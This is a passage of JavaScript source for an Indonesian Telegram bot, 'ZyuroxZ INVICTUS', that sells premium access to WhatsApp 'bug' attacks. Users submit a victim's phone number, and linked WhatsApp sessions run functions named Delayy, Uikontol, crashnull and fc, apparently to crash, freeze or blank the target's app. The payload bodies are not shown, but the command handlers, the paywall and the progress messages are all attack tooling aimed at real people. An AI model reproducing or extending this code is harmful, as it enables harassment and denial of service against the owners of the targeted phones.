\`\`\`
#- ZyuroxZ INVICTUS
╰➤ I N V I S ☇  B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ I N V I S ☇  B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
   
    await Delayy(jid);
    
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ D E L A Y ☇  B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuroxZui (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- ZyuroxZ INVICTUS
╰➤  U I - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ U I - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Uikontol(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ U I- B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/cn (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ B L A N K - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ B L A N K - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await crashnull(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ B L A N K - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/x (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VallOffcial" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://j.top4top.io/p_3529xgv5n1.jpg", {
      caption: `
\`\`\`
#- ZyuroxZ INVICTUS
╰➤F R E E Z - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ F R E E Z - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await fc(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- ZyuroxZ INVICTUS
╰➤ F R E E Z - B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//hapus bug
bot.onText(/\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await bot.sendMessage(target, { 
                text: "CROW CLEAR BUG \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCROW CLEAR BUG"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By ZyuroxZ!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});
